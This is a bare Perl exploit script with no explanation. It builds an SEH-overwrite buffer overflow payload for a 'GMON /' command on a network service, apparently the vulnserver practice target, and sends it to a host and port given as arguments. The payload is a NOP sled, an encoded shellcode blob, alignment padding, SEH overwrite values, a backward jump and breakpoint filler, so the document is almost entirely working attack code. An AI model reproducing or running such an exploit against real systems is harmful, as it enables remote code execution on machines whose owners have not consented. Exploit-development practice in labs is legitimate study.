#!/usr/bin/perl

use IO::Socket::INET;

my $pref  = "GMON /AAAA";
my $buf   = "\x90" x 2994;
#my $seh1 = "\x90\x90\xEB\x04";		# nop, nop, jmp+4
my $seh2 = pack("V", 0x6250615a);	# popad
my $seh1  = "CCCC";
#my $seh2  = "DDDD"; 
my $shell = "\xCC" x 700;
my $bjmp  = "\xE9\xF4\xFC\xFF\xFF";   # jmp near -780
my $shellcode = 
"\x89\xe6\xdb\xd1\xd9\x76\xf4\x5e\x56\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a" .
"\x48\x4d\x59\x45\x50\x45\x50\x45\x50\x45\x30\x4d\x59\x4b" .
"\x55\x46\x51\x4e\x32\x43\x54\x4c\x4b\x46\x32\x46\x50\x4c" .
"\x4b\x50\x52\x44\x4c\x4c\x4b\x51\x42\x42\x34\x4c\x4b\x42" .
"\x52\x47\x58\x44\x4f\x4f\x47\x50\x4a\x51\x36\x50\x31\x4b" .
"\x4f\x46\x51\x49\x50\x4e\x4c\x47\x4c\x45\x31\x43\x4c\x44" .
"\x42\x46\x4c\x47\x50\x49\x51\x48\x4f\x44\x4d\x43\x31\x48" .
"\x47\x4a\x42\x4a\x50\x51\x42\x46\x37\x4c\x4b\x50\x52\x42" .
"\x30\x4c\x4b\x51\x52\x47\x4c\x43\x31\x4e\x30\x4c\x4b\x47" .
"\x30\x43\x48\x4b\x35\x4f\x30\x44\x34\x51\x5a\x45\x51\x4e" .
"\x30\x50\x50\x4c\x4b\x51\x58\x42\x38\x4c\x4b\x51\x48\x47" .
"\x50\x43\x31\x4e\x33\x4a\x43\x47\x4c\x47\x39\x4c\x4b\x47" .
"\x44\x4c\x4b\x45\x51\x48\x56\x46\x51\x4b\x4f\x50\x31\x49" .
"\x50\x4e\x4c\x49\x51\x48\x4f\x44\x4d\x43\x31\x48\x47\x47" .
"\x48\x4b\x50\x42\x55\x4b\x44\x43\x33\x43\x4d\x4c\x38\x47" .
"\x4b\x43\x4d\x46\x44\x43\x45\x4a\x42\x51\x48\x4c\x4b\x51" .
"\x48\x51\x34\x45\x51\x48\x53\x42\x46\x4c\x4b\x44\x4c\x50" .
"\x4b\x4c\x4b\x51\x48\x45\x4c\x43\x31\x49\x43\x4c\x4b\x44" .
"\x44\x4c\x4b\x45\x51\x48\x50\x4b\x39\x50\x44\x47\x54\x51" .
"\x34\x51\x4b\x51\x4b\x45\x31\x46\x39\x51\x4a\x46\x31\x4b" .
"\x4f\x4d\x30\x46\x38\x51\x4f\x50\x5a\x4c\x4b\x44\x52\x4a" .
"\x4b\x4b\x36\x51\x4d\x42\x4a\x45\x51\x4c\x4d\x4c\x45\x48" .
"\x39\x43\x30\x43\x30\x45\x50\x46\x30\x42\x48\x46\x51\x4c" .
"\x4b\x42\x4f\x4b\x37\x4b\x4f\x4e\x35\x4f\x4b\x4a\x50\x4f" .
"\x45\x4f\x52\x50\x56\x43\x58\x4e\x46\x4a\x35\x4f\x4d\x4d" .
"\x4d\x4b\x4f\x49\x45\x47\x4c\x44\x46\x43\x4c\x44\x4a\x4b" .
"\x30\x4b\x4b\x4b\x50\x42\x55\x45\x55\x4f\x4b\x47\x37\x42" .
"\x33\x44\x32\x42\x4f\x42\x4a\x45\x50\x46\x33\x4b\x4f\x48" .
"\x55\x43\x53\x45\x31\x42\x4c\x42\x43\x46\x4e\x43\x55\x44" .
"\x38\x45\x35\x45\x50\x45\x5a\x41\x41";
my $align = "A" x 29;

my $evil = $pref . $buf . $shellcode . $align . $seh1 . $seh2 . $bjmp . $shell ;

my $socket = IO::Socket::INET->new("$ARGV[0]:$ARGV[1]"); #192.168.58.134 9999
print $socket $evil;
close($socket);